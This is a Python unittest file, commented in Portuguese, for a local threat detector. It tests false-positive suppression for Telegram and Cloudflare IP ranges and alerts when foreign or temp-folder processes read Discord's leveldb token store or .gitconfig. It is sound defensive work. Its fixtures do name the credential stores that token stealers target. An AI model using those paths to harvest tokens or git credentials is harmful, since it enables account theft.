            conexoes = [{"ip": "149.154.175.53", "processo": "telegram.exe", "pid": 1234}]
            alertas = detector_ameacas.verificar_ips_maliciosos(conexoes, houve_acesso_token=False)
            
            # Como o IP é do Telegram e o hostname resolvido é 'gestaotg.telegram.org',
            # deve ser suprimido (retornando uma lista de alertas vazia)
            self.assertEqual(len(alertas), 0, f"Deveria ter sido suprimido, mas gerou: {alertas}")
            
            # E o cache deve estar atualizado com o hostname resolvido
            self.assertEqual(detector_ameacas.cache_ips["149.154.175.53"].get("hostname"), "gestaotg.telegram.org")
            
        finally:
            socket.gethostbyaddr = orig_gethostbyaddr
        print("✅ Teste de Telegram suprimido por hostname concluído!")

    def test_cloudflare_cidr_suprimido(self):
        print("\n[TEST] Iniciando teste de Cloudflare CIDR suprimido")
        import detector_ameacas
        
        # IP oficial do Cloudflare CDN
        ip_cf = "162.159.134.234"
        self.assertEqual(detector_ameacas.obter_organizacao_por_cidr(ip_cf), "cloudflare")
        
        dados_otx = {"total_pulsos": 2, "malwares": ["Legit-CDN"]}
        # chrome.exe é confiável para cloudflare. Deve ser suprimido.
        self.assertTrue(detector_ameacas.eh_falso_positivo("chrome.exe", ip_cf, dados_otx, houve_acesso_token=False))
        print("✅ Teste de Cloudflare CIDR suprimido concluído!")

    def test_telegram_cidr_suprimido(self):
        print("\n[TEST] Iniciando teste de Telegram CIDR suprimido")
        import detector_ameacas
        
        # IP oficial do Telegram CDN
        ip_tg = "149.154.175.53"
        self.assertEqual(detector_ameacas.obter_organizacao_por_cidr(ip_tg), "telegram")
        
        dados_otx = {"total_pulsos": 2, "malwares": ["Telegram-CDN"]}
        # telegram.exe é confiável para telegram. Deve ser suprimido.
        self.assertTrue(detector_ameacas.eh_falso_positivo("telegram.exe", ip_tg, dados_otx, houve_acesso_token=False))
        print("✅ Teste de Telegram CIDR suprimido concluído!")

    def test_ip_fora_cidr_nao_suprimido(self):
        print("\n[TEST] Iniciando teste de IP fora do CIDR não suprimido")
        import detector_ameacas
        
        # Um IP que não pertence a nenhuma infraestrutura confiável
        ip_desconhecido = "198.51.100.42"
        self.assertEqual(detector_ameacas.obter_organizacao_por_cidr(ip_desconhecido), "")
        
        dados_otx = {"total_pulsos": 2, "malwares": ["Malware-C2"]}
        # Não deve ser suprimido.
        self.assertFalse(detector_ameacas.eh_falso_positivo("chrome.exe", ip_desconhecido, dados_otx, houve_acesso_token=False))
        print("✅ Teste de IP fora do CIDR não suprimido concluído!")

    def test_acesso_proprio_leveldb_ignorado(self):
        print("\n[TEST] Iniciando teste de acesso ao próprio leveldb ignorado")
        import detector_tokens
        
        detector_tokens.acessos_detectados.clear()
        # whatsapp.exe acessando seu próprio leveldb
        detector_tokens.acessos_detectados.append({
            'caminho': 'C:\\Users\\roger\\AppData\\Local\\Packages\\WhatsApp_xyz\\LocalState\\leveldb',
            'pid': 9993,
            'nome': 'whatsapp.exe',
            'exe_path': 'C:\\Program Files\\WindowsApps\\WhatsApp.exe',
            'timestamp': time.time()
        })
        
        alertas = detector_tokens.verificar_acesso_tokens()
        self.assertEqual(len(alertas), 0, f"Deveria ter ignorado o acesso próprio de leveldb, mas gerou: {alertas}")
        print("✅ Teste de acesso ao próprio leveldb ignorado concluído!")

    def test_acesso_processo_alheio_leveldb_alertado(self):
        print("\n[TEST] Iniciando teste de acesso de processo ao leveldb do Discord")
        import detector_tokens
        
        detector_tokens.acessos_detectados.clear()
        # whatsapp.exe acessando o leveldb do Discord (tentativa de roubo de token)
        detector_tokens.acessos_detectados.append({
            'caminho': 'C:\\Users\\roger\\AppData\\Roaming\\discord\\Local Storage\\leveldb',
            'pid': 9993,
            'nome': 'whatsapp.exe',
            'exe_path': 'C:\\Program Files\\WindowsApps\\WhatsApp.exe',
            'timestamp': time.time()
        })
        
        alertas = detector_tokens.verificar_acesso_tokens()
        tipos = [a['tipo'] for a in alertas]
        self.assertIn('acesso_token_suspeito', tipos, f"Deveria ter alertado acesso ao Discord leveldb por outro processo.")
        print("✅ Teste de acesso de processo ao leveldb do Discord concluído!")

    def test_processo_desconhecido_leveldb_alertado(self):
        print("\n[TEST] Iniciando teste de processo desconhecido acessando leveldb")
        import detector_tokens
        
        detector_tokens.acessos_detectados.clear()
        # Um processo estranho acessando o leveldb do Discord
        detector_tokens.acessos_detectados.append({
            'caminho': 'C:\\Users\\roger\\AppData\\Roaming\\discord\\Local Storage\\leveldb',
            'pid': 9994,
            'nome': 'unknown_app.exe',
            'exe_path': 'C:\\Users\\roger\\AppData\\Local\\Temp\\unknown_app.exe',
            'timestamp': time.time()
        })
        
        alertas = detector_tokens.verificar_acesso_tokens()
        tipos = [a['tipo'] for a in alertas]
        self.assertIn('acesso_token_suspeito', tipos, f"Deveria ter alertado acesso suspeito.")
        print("✅ Teste de processo desconhecido acessando leveldb concluído!")

    def test_gitconfig_sem_processo_ignorado(self):
        print("\n[TEST] Iniciando teste de .gitconfig sem processo ignorado")
        import detector_tokens
        
        detector_tokens.acessos_detectados.clear()
        # Acesso sem processo identificado ao .gitconfig
        detector_tokens.acessos_detectados.append({
            'caminho': 'C:\\Users\\roger\\.gitconfig',
            'pid': None,
            'nome': None,
            'exe_path': None,
            'timestamp': time.time()
        })
        # Acesso sem processo identificado ao Discord leveldb
        detector_tokens.acessos_detectados.append({
            'caminho': 'C:\\Users\\roger\\AppData\\Roaming\\discord\\Local Storage\\leveldb',
            'pid': None,
            'nome': None,
            'exe_path': None,
            'timestamp': time.time()
        })
        
        alertas = detector_tokens.verificar_acesso_tokens()
        self.assertEqual(len(alertas), 0, f"Acessos não identificados ao .gitconfig e Discord leveldb deveriam ser ignorados, mas gerou: {alertas}")
        print("✅ Teste de .gitconfig sem processo ignorado concluído!")

    def test_gitconfig_com_processo_suspeito_alerta(self):
        print("\n[TEST] Iniciando teste de .gitconfig com processo suspeito alertado")
        import detector_tokens
        
        detector_tokens.acessos_detectados.clear()
        # Acesso com processo suspeito ao .gitconfig
        detector_tokens.acessos_detectados.append({
            'caminho': 'C:\\Users\\roger\\.gitconfig',
            'pid': 9995,
            'nome': 'malicioso.exe',
            'exe_path': 'C:\\Users\\roger\\AppData\\Local\\Temp\\malicioso.exe',
            'timestamp': time.time()
        })
        
        alertas = detector_tokens.verificar_acesso_tokens()
        tipos = [a['tipo'] for a in alertas]
        self.assertIn('acesso_token_suspeito', tipos, "Deveria ter alertado acesso suspeito ao .gitconfig.")
        print("✅ Teste de .gitconfig com processo suspeito alertado concluído!")

if __name__ == "__main__":
    unittest.main()
